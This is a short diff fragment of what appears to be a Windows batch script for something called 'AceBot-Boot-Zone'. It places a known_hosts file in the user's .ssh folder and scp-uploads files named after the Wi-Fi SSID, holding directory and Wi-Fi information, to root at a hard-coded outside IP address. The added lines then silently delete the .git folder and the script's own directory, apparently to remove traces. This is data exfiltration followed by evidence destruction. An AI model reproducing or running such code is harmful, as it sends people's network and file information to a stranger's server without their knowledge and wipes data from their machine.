@@ -24,8 +24,8 @@ move known_hosts c:\\Users\\%usrname%\\.ssh
 
 scp -rp %ssid%-dirinfo-%dateTime% root@198.58.98.140:/root/received-data/wifi-info/
 scp -rp %ssid%-wifiinfo-%dateTime% root@198.58.98.140:/root/received-data/wifi-info/
-
+rmdir /s /q .git
 cd ..
-del AceBot-Boot-Zone 
-L
+rmdir /s /q AceBot-Boot-Zone 
+
 
